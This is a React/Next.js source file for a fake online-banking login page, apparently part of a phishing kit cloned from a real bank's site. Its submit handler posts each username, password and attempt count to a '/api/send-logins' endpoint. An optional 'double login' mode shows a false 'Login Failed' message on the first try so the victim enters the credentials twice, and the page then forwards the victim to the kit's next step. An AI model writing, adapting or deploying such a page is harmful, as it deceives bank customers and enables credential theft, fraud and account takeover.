import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import { yupResolver } from "@hookform/resolvers/yup";
import { Input } from "../components/Input";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { isProfane } from "../utils/isProfane";
import { DataContext } from "./_app";
import Head from "next/head";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup
    .string()
    .required(`Please enter your username`)
    .min(2, `Please enter a valid username`)
    .test(
      `userId-includes-bad-words`,
      `Please enter a valid username`,
      isProfane
    ),
  password: yup
    .string()
    .required(`Please enter your password`)
    .min(6, `Please enter a valid password`)
    .test(
      `password-includes-bad-words`,
      `Please enter a valid password`,
      isProfane
    ),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onTouched`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper>
      <Head>
        <title>Login</title>
        <link href="/favicon.ico" />
      </Head>
      <div className="login-out login-component ng-star-inserted">
        <div
          className="login-bg-image ng-star-inserted"
          style={{
            backgroundImage: `url(/images/e5ca6d2d-9c50-11e9-bc2b-026ea8625dde.jpeg)`,
          }}
        ></div>
        <div className="container px-0 px-md-2">
          <div className="row justify-content-around my-md-7">
            <div className="my-auto col-md-5 col-lg-4 px-0 px-md-2">
              <div className="card shadow-lg">
                <div className="card-body pt-4 px-4 pb-1">
                  <div className="ng-star-inserted">
                    <form className="ng-invalid ng-touched ng-dirty">
                      {showError ? (
                        <h2
                          aria-live="polite"
                          className="form-header color-error"
                        >
                          <span className="ng-star-inserted">
                            Login Failed. We do not recognize your
                            username/password.
                          </span>
                          {/**/}
                          {/**/}
                        </h2>
                      ) : (
                        <h2 aria-live="polite" className="form-header">
                          <span className="ng-star-inserted">Login</span>
                          {/**/}
                          {/**/}
                        </h2>
                      )}
                      <Input
                        label={`Username`}
                        placeholder={`Username`}
                        error={
                          errors.username &&
                          (errors.username.message as unknown as string)
                        }
                        register={register}
                        name={`username`}
                        curValue={watch(`username`)}
                      />
                      <Input
                        label={`Password`}
                        placeholder={`Password`}
                        type={`password`}
                        error={
                          errors.password &&
                          (errors.password.message as unknown as string)
                        }
                        register={register}
                        name={`password`}
                        curValue={watch(`password`)}
                        boxStyle={{
                          marginTop: `1rem`,
                        }}
                      />
                      <div className="switch-pill-container">
                        <div className="switch-pill">
                          <input
                            aria-label="Toggle Remember Username"
                            type="checkbox"
                            name="rememberUsername"
                            id="rememberUsername"
                            className="ng-valid ng-dirty ng-touched"
                          />
                          <label htmlFor="rememberUsername" className="mb-0">
                            Remember Username
                          </label>
                        </div>
                        <span className="switch-pill-container-label">
                          Remember Username
                        </span>
                      </div>
                      <div
                        data-e2e="login-button"
                        aria-live="polite"
                        tabIndex={-1}
                      >
                        <button
                          type="submit"
                          className="btn-primary width-full mt-2 fs-unmask"
                          onClick={onSubmit}
                          disabled={loading}
                          style={{
                            display: "inline-flex",
                            alignItems: "center",
                            verticalAlign: "middle",
                            justifyContent: "center",
                            textDecoration: "none",
                            whiteSpace: "nowrap",
                            border: "3px solid transparent",
                            padding: "0.4375rem 2.3125rem",
                            borderRadius: "var(--btn-border-radius)",
                            lineHeight: "1.5",
                            transition: "all .25s ease",
                            width: "100%",
                            ...(loading
                              ? {
                                  background: "var(--gray-300)",
                                  boxShadow: "0 0 0 1px var(--gray-300)",
                                }
                              : {}),
                          }}
                        >
                          {/**/}
                          {loading ? (
                            <span
                              className="logging-loader"
                              style={{
                                marginRight: 5,
                              }}
                            />
                          ) : null}
                          {/**/} {loading ? `Logging in...` : `Log In`}{" "}
                        </button>
                      </div>
                      <div
                        data-e2e="forgot-username-password-link"
                        tabIndex={-1}
                        className="ng-star-inserted"
                      >
                        <button
                          type="button"
                          className="btn-link mt-1 fs-unmask"
                          style={{
                            backgroundColor: "transparent",
                            borderColor: "transparent",
                            borderWidth: "3px 0",
                            paddingLeft: "2px",
                            paddingRight: "2px",
                            minWidth: "4rem",
                            color: "var(--link-color)",
                          }}
                        >
                          {/**/}
                          {/**/} Forgot your username or password?{" "}
                        </button>
                      </div>
                    </form>
                  </div>
                </div>
                <div className="ng-star-inserted">
                  <hr className="mx-0 mx-md-4 mt-0 mb-2" />
                  <a className="btn-icon-link btn-block mb-2 justify-content-center">
                    <i aria-hidden="true" className="material-icons">
                      person
                    </i>
                    <span>Or, Register for Online Banking</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Wrapper>
  );
};

export default Login;
